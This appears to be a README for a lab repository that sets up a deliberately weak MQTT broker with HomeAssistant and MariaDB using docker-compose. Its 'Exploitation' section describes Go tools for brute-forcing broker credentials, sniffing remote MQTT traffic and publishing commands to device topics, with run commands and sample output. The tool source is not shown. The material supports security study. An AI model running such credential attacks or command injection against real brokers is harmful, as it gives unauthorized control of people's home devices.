# VulnerabilityMQTT

## Setup
Up MQTT-broker, HomeAssistant and MariaDB
```shell
docker-compose build
docker-compose up -d 
```
For work with mqtt from HomeAssistant add this to `homeassistant/config/configuration.yaml`
```
mqtt:
broker: <broker_ip>

switch:
- platform: mqtt
  unique_id: 1
  name: "Ariston"
  command_topic: "light/1"
  qos: 1
  payload_on: "on"
  payload_off: "off"
  state_on: "ON"
  state_off: "OFF"
  retain: true
```

Then add MQTT to Integrations in HomeAssistant settings:

Settings -> Integrations -> ( + add Integration) -> MQTT

## Exploitation
### Brute Broker pass
Script for bruteforce login:pass from dictionaries
```shell
go run exploitation/bruteforce/main.go
```
Output after some time:
```shell
Get valid Credentials
Login: <login>
Password: <password>
```

### Sniff all MQTT traffic
Utility for sniffing remote MQTT traffic 
```shell
go run exploitation/sniff/main.go
```
Check logs:
```shell
tail -f exploitation/sniff/commands.csv 
...
Mar  3 21:30:46,light/1/,off
Mar  3 21:30:50,light/1/,on
```

### Execute commands
Simple shell for remote execute commands
```shell
go run exploitation/execute/main.go
```
Output:
```shell
Connected to tcp://<broker_ip>:1883
Top of topics:
0. light/1/
...
Choose topic: 0
------------------
[Topic] <- Command
------------------
[light/1/] <- on
[light/1/] <- off

```

